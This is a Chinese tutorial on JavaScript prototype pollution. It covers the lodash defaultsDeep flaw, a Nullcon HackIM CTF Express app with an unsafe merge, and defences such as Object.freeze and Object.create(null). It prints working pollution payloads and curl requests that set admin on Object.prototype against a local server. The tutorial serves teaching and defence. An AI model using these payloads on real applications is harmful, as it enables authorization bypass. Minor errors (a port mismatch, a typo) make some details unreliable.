## 漏洞原因

其实漏洞很简单，举一个例子：lodash 中 defaultsDeep 方法，

```js
_.defaultsDeep({ 'a': { 'b': 2 } }, { 'a': { 'b': 1, 'c': 3 } })
```

输出：

```js
{ 'a': { 'b': 2, 'c': 3 } }
```

如上例，该方法：

> 分配来源对象（该方法的第二个参数）的可枚举属性到目标对象（该方法的第一个参数）所有解析为 undefined 的属性上



这样的操作存在的隐患：

```js
const payload = '{"constructor": {"prototype": {"toString": true}}}'

_.defaultsDeep({}, JSON.parse(payload))
```



如此一来，就触发了原型污染。原型污染是指：

> 攻击者通过某种手段修改 JavaScript 对象的原型（prototype）

对应上例，`Object.prototype.toString` 就会非常不安全了。

## 详解原型污染

理解原型污染，需要读者理解 JavaScript 当中的原型、原型链的知识。我们先来看一个例子：

```js
// person 是一个简单的 JavaScript 对象
let person = {name: 'lucas'}

// 输出 lucas
console.log(person.name)

// 修改 person 的原型
person.__proto__.name = 'messi'

// 由于原型链顺序查找的原因，person.name 仍然是 lucas
console.log(person.name)

// 再创建一个空的 person2 对象
let person2 = {}

// 查看 person2.name，输出 messi
console.log(person2.name)
```

把危害扩大化：

```js
let person = {name: 'lucas'}

console.log(person.name)

person.__proto__.toString = () => {alert('evil')}

console.log(person.name)

let person2 = {}

console.log(person2.toString())
```

这段代码执行将会 alert 出 evil 文字。同时 `Object.prototype.toString` 这个方法会在隐式转换以及类型判断中经常被用到：

> Object.prototype.toString 方法返回一个表示该对象的字符串

每个对象都有一个 `toString()` 方法，当该对象被表示为一个文本值时，或者一个对象以预期的字符串方式引用时自动调用。默认情况下，`toString()` 方法被每个 Object 对象继承。如果此方法在自定义对象中未被覆盖，`toString()` 返回 `[object type]`，其中 type 是对象的类型。

如果 Object 原型上的 toString 被污染，后果可想而知。以此为例，可见 lodash 这次漏洞算是比较严重了。

## 再谈原型污染（NodeJS 漏洞案例）

由上分析，我们知道原型污染并不是什么新鲜的漏洞，它“随时可见”，“随处可见”。在 Nullcon HackIM 比赛中就有一个类似的 hack 题目：

```js
'use strict';
 
const express = require('express');
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser');
const path = require('path');
 
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
 
function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}
 
function clone(a) {
    return merge({}, a);
}
 
// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const admin = {};
 
// App
const app = express();
app.use(bodyParser.json())
app.use(cookieParser());
 
app.use('/', express.static(path.join(__dirname, 'views')));
app.post('/signup', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body)
    if (copybody.name) {
        res.cookie('name', copybody.name).json({
            "done": "cookie set"
        });
    } else {
        res.json({
            "error": "cookie not set"
        })
    }
});
app.get('/getFlag', (req, res) => {
    var аdmin = JSON.parse(JSON.stringify(req.cookies))
    if (admin.аdmin == 1) {
        res.send("hackim19{}");
    } else {
        res.send("You are not authorized");
    }
});
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);
```

这段代码的漏洞就在于 merge 函数上，我们可以这样攻击：

```bash
curl -vv --header 'Content-type: application/json' -d '{"__proto__": {"admin": 1}}' 'http://0.0.0.0:4000/signup'; 

curl -vv 'http://0.0.0.0:4000/getFlag'
```

首先请求 `/signup` 接口，在 NodeJS 服务中，我们调用了有漏洞的 `merge` 方法，并通过 `__proto__` 为 `Object.prototype`（因为 `{}.__proto__ === Object.prototype`） 添加上一个新的属性 `admin`，且值为 1。

再次请求 `getFlag` 接口，条件语句 `admin.аdmin == 1` 为 `true`，服务被攻击。

攻击案例出自：[Prototype pollution attacks in NodeJS applications](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLUsiFV3dsK8)

这样的漏洞在 jQuery `$.extend` 中也经常见到：

- [jQuery 修复原型污染 PR](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fgithub.com%2Fjquery%2Fjquery%2Fpull%2F4333)
- [jQuery prototype pollution vulnerability](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fsnyk.io%2Fblog%2Fafter-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again%2F)

对于 jQuery：如果担心安全问题，建议升级至最新版本 jQuery 3.4.0，如果还在使用 jQuery 的 1.x 和 2.x 版本，那么你的应用程序和网站仍有可能遭受攻击。

## 防范原型污染

了解了漏洞潜在问题以及攻击手段，那么如何防范呢？

在 lodash “连夜”发版的修复中：

![img](https://pic4.zhimg.com/80/v2-754bff40be2234978a89f3188eda03cb_720w.jpg)


我们可以清晰的看到，在遍历 merge 时，当遇见 `constructor` 以及 `__proto__` 敏感属性，则退出程序。

那么作为业务开发者，我们需要注意些什么，防止攻击出现呢？总结一下有：

- 冻结 `Object.prototype`，使原型不能扩充属性

我们可以采用 `Object.freeze` 达到目的：

> Object.freeze() 方法可以冻结一个对象。一个被冻结的对象再也不能被修改；冻结了一个对象则不能向这个对象添加新的属性，不能删除已有属性，不能修改该对象已有属性的可枚举性、可配置性、可写性，以及不能修改已有属性的值。此外，冻结一个对象后该对象的原型也不能被修改。freeze() 返回和传入的参数相同的对象。

看代码：

```js
Object.freeze(Object.prototype);

Object.prototype.toString = 'evil'

consoel.log(Object.prototype.toString)
ƒ toString() { [native code] }
```

对比：

```js
Object.prototype.toString = 'evil'

console.log(Object.prototype.toString)
"evil"
```

- 建立 JSON schema
  在解析用户输入内容是，通过 JSON schema 过滤敏感键名。
- 规避不安全的递归性合并
  这一点类似 lodash 修复手段，完善了合并操作的安全性，对敏感键名跳过处理
- 使用无原型对象
  在创建对象时，不采用字面量方式，而是使用 `Object.create(null)`：

> Object.create()方法创建一个新对象，使用现有的对象来提供新创建的对象的`__proto__`

`Object.create(null)` 的返回值不会链接到 `Object.prototype`：

```js
let foo = Object.create(null)
console.log(foo.__proto__)
// undefined
```

这样一来，无论如何扩充对象，都不会干扰到原型了。

- 采用新的 Map 数据类型，代替 Object 类型

Map 对象保存键/值对，是键/值对的集合。任何值（对象或者原始值）都可以作为一个键或一个值。使用 Map 数据结构，不会存在 Object 原型污染状况。

这里总结一下 Map 和 Object 不同点：：

- Object 的键只支持 String 或者 Symbols 两种类型，Map 的键可以是任意值，包括函数、对象、基本类型
- Map 中的键值是有序的，而 Object 中的键则不是
- 具体 API 上的差异：比如，通过 size 属性直接获取一个 Map 的键值对个数，而 Object 的键值无法获取；再比如迭代一个 Map 和 Object 差异也比较明显
- Map 在频繁增删键值对的场景下会有些性能优势

## 补充：V8，chromium 的小机灵

同样存在风险的是我们常用的 `JSON.parse` 方法，但是如果你运行：

```js
JSON.parse('{ "a":1, "__proto__": { "b": 2 }}')
```

你会发现返回的结果如图：

![img](https://pic2.zhimg.com/80/v2-0f413f4dda58219f5ba2ff8b527720d1_720w.jpg)



复写 `Object.prototype` 失败了，`__proto__` 属性还是我们熟悉的那个有安全感的 `__proto__` 。这是因为：

> V8 ignores keys named proto in JSON.parse

这个相关讨论 Doug Crockford，Brendan Eich，反正 chromium 和 JS 发明人讨论过很多次。相关 issue 和 PR：

- [chromium 讨论](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fbugs.chromium.org%2Fp%2Fc%2Fissues%2Fdetail%3Fid%3D115055)
- [chromium 讨论](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fbugs.chromium.org%2Fp%2Fv8%2Fissues%2Fdetail%3Fid%3D621)

相关 ES 语言设计的讨论：[ES 语言设计的讨论：proto-and-json](https://link.zhihu.com/?target=https%3A//links.jianshu.com/go%3Fto%3Dhttps%3A%2F%2Fesdiscuss.org%2Ftopic%2Fproto-and-json)

在上面链接中，你能发现 JavaScript 发明人等一众大佬哦～

总之你可以记住，V8 默认使用 `JSON.parse` 时候会忽略 `__proto__`，原因当然是之前分析的安全性了。